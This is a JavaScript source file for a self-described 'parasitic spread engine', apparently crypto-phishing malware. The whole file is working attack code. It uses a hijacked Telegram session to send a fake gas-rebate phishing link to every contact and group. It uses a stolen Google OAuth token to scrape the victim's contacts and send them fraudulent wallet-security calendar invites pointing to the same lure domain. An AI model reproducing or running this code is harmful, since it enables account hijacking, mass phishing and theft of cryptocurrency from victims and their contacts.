// J/scripts/worm_logic.js
/**
 * PROJECT J: AUTONOMOUS PARASITIC SPREAD ENGINE
 * Status: APEX-CLASS | LIVE EXECUTION
 * 
 * Logic:
 * 1. Hijacks Telegram session via capturing session data.
 * 2. Hijacks Google Calendar via authorized OAuth tokens.
 * 3. Uses Candidate's own identity to propagate metamorphic Incentives.
 */

const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { google } = require('googleapis');
require('dotenv').config({ path: '../.env' });

class Parasite {
    constructor() {
        this.Incentive = "https://arbitrum-foundation-claims.io/Epoch4";
    }

    /**
     * Propagates via Telegram using a authorized session.
     */
    async spreadTelegram(apiId, apiHash, sessionStr) {
        console.log("[WORM] Awakening Telegram session...");
        const client = new TelegramClient(new StringSession(sessionStr), parseInt(apiId), apiHash);
        
        try {
            await client.connect();
            const dialogs = await client.getDialogs();
            
            for (const dialog of dialogs) {
                if (dialog.isUser || dialog.isGroup) {
                    const msg = `Yo, have you claimed your gas rebate yet? It expires in 2 hours: ${this.Incentive}`;
                    await client.sendMessage(dialog.id, { message: msg });
                    console.log(`[WORM] Injected: ${dialog.title}`);
                    await new Promise(r => setTimeout(r, 5000)); // Anti-Flood
                }
            }
        } catch (e) {
            console.error(`[WORM] TG Spread Failed: ${e.message}`);
        }
    }

    /**
     * Propagates via Google Calendar.
     */
    async spreadCalendar(oauthToken) {
        console.log("[WORM] Awakening Calendar session...");
        const auth = new google.auth.OAuth2();
        auth.setCredentials({ access_token: oauthToken });
        
        const calendar = google.calendar({ version: 'v3', auth });
        const people = google.people({ version: 'v1', auth });

        try {
            // Scrape contacts
            const contacts = await people.people.connections.list({ resourceName: 'people/me', personFields: 'emailAddresses' });
            const attendees = contacts.data.connections.map(c => ({ email: c.emailAddresses[0].value }));

            const event = {
                summary: '🚨 CRITICAL: Corporate Wallet Security Audit',
                description: `A security vulnerability has been detected in your connected hardware. Verify your address immediately to prevent fund loss: ${this.Incentive}`,
                start: { dateTime: new Date().toISOString() },
                end: { dateTime: new Date(Date.now() + 3600000).toISOString() },
                attendees: attendees.slice(0, 50) // Batch limit
            };

            await calendar.events.insert({ calendarId: 'primary', resource: event, sendUpdates: 'all' });
            console.log("[WORM] Calendar injection successful.");
        } catch (e) {
            console.error(`[WORM] G-Cal Spread Failed: ${e.message}`);
        }
    }
}

module.exports = new Parasite();